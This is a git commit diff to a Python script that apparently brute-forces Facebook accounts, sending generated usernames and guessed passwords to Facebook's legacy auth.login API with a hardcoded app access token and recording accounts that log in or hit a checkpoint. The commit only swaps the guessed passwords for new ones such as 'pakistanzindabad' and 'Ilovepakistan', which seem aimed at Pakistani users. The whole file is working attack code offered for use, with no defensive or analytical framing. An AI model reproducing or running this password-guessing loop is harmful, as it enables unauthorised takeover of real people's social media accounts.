72955076b35df05a2af684acdf6d5dcf484cc76c
zulfiQar kinG <72867815+zulfiQarkinG@users.noreply.github.com>
2020-12-25 11:18:24 +0500

    Update 1.py

--- 1.py
+++ 1.py
@@ -334,7 +334,7 @@ def action():
                             cps.close()
                             cpb.append(c+user+pass2)
                         else:
-                            pass3="Freefireking"
+                            pass3="pakistanzindabad"
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
@@ -351,7 +351,7 @@ def action():
                                     cps.close()
                                     cpb.append(c+user+pass3)
                                 else:
-                                    pass4="Freefire"
+                                    pass4="Ilovepakistan"
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
@@ -368,7 +368,7 @@ def action():
                                             cps.close()
                                             cpb.append(c+user+pass4)
                                         else:
-                                            pass5="Freefirelover"
+                                            pass5="Shahdadkot"
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
